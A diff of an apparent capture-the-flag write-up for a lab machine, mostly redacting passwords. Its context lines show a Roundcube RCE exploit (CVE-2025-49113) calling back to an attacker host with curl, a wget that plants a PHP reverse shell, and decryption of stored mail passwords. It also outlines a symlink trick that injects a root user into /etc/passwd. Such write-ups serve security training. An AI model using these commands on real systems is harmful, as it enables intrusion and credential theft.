@@ -56,7 +56,7 @@ ffuf -w /home/bhugo97/.pentest-toolbox/wordlists/subdomain-wordlist.txt \
 
 ### Roundcube Webmail
 
-The site is running **Roundcube webmail**. We're provided with starting credentials `tyler:LhKL1o9Nm3X2`, but they don't work for the Roundcube login or SSH.
+The site is running **Roundcube webmail**. We're provided with starting credentials `tyler:[REDACTED]`, but they don't work for the Roundcube login or SSH.
 
 ### UDP Scanning
 
@@ -128,7 +128,7 @@ We test if the exploit works by making the target reach out to our server:
 python3 -m http.server 8000
 
 # Terminal 2: Run exploit
-php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'curl http://10.10.15.79:8000/$(whoami)'
+php CVE-2025-49113.php http://mail.outbound.htb/ tyler [REDACTED] 'curl http://10.10.15.79:8000/$(whoami)'
 ```
 
 We receive a connection confirming RCE:
@@ -144,7 +144,7 @@ Success! We're executing commands as `www-data`.
 We upload a PHP reverse shell:
 
 ```bash
-php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 \
+php CVE-2025-49113.php http://mail.outbound.htb/ tyler [REDACTED] \
   'wget -O /var/www/html/roundcube/public_html/shell.php http://10.10.15.79:8000/shell.php'
 ```
 
@@ -158,7 +158,7 @@ We're able to switch to the tyler user with the provided credentials:
 
 ```bash
 su tyler
-# Password: LhKL1o9Nm3X2
+# Password: [REDACTED]
 ```
 
 ### LinPEAS Enumeration
@@ -180,14 +180,15 @@ Jacob has significantly more mail than other users, suggesting he might be an ad
 In `/var/www/html/roundcube/config/config.inc.php`:
 
 ```php
-$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+$config['db_dsnw'] = 'mysql://roundcube:[REDACTED]@localhost/roundcube';
 $config['imap_host'] = 'localhost:143';
 $config['smtp_host'] = 'localhost:587';
 $config['des_key'] = 'rcmail-!24ByteDESkey*Str';
 ```
 
 Key findings:
-- MySQL credentials: `roundcube:RCDBPass2025`
+
+- MySQL credentials: `roundcube:[REDACTED]`
 - Roundcube DES key for encrypting stored passwords
 
 ## MySQL Database Exploration
@@ -195,7 +196,7 @@ Key findings:
 ### Connecting to MySQL
 
 ```bash
-mysql -u roundcube -p'RCDBPass2025' -S /run/mysqld/mysqld.sock roundcube
+mysql -u roundcube -p'[REDACTED]' -S /run/mysqld/mysqld.sock roundcube
 ```
 
 ### Examining Tables
@@ -205,6 +206,7 @@ SHOW TABLES;
 ```
 
 Tables of interest:
+
 - users
 - session
 - identities
@@ -250,7 +252,7 @@ echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7..." | base64 -d
 This reveals jacob's encrypted password:
 
 ```
-password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
+password|s:32:"[REDACTED]/";
 ```
 
 ### Decrypting the Password
@@ -264,7 +266,7 @@ require_once '/var/www/html/roundcube/program/lib/Roundcube/bootstrap.php';
 \$rcube = rcube::get_instance();
 \$rcube->config->set('des_key', 'rcmail-!24ByteDESkey*Str');
 
-\$encrypted = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
+\$encrypted = '[REDACTED]/';
 \$password = \$rcube->decrypt(\$encrypted);
 
 echo 'Password: ' . \$password . PHP_EOL;
@@ -274,14 +276,14 @@ echo 'Password: ' . \$password . PHP_EOL;
 Result:
 
 ```
-Password: 595mO8DmwGeD
+Password: [REDACTED]
 ```
 
 ### Switching to Jacob
 
 ```bash
 su jacob
-# Password: 595mO8DmwGeD
+# Password: [REDACTED]
 ```
 
 ## Container Escape via SSH
@@ -302,7 +304,7 @@ Date: Sat, 7 Jun 2025 14:00:58 +0000
 
 Due to the recent change of policies your password has been changed.
 
-Please use the following credentials to log into your account: gY4Wr3a1evp4
+Please use the following credentials to log into your account: [REDACTED]
 
 Remember to change your password when you next log into your account.
 
@@ -332,7 +334,7 @@ We use jacob's credentials from the email to SSH to the host:
 
 ```bash
 ssh jacob@10.129.99.99
-# Password: gY4Wr3a1evp4
+# Password: [REDACTED]
 ```
 
 Success! We can now retrieve the user flag from jacob's desktop.
@@ -422,6 +424,7 @@ chmod +x exploit.sh
 ```
 
 The exploit:
+
 1. Creates a symlink from `/var/log/below/error_root.log` to `/etc/passwd`
 2. Forces `below` to write to the log file (which is now symlinked to `/etc/passwd`)
 3. Injects a new root user named `haxor` with password `hacked123`
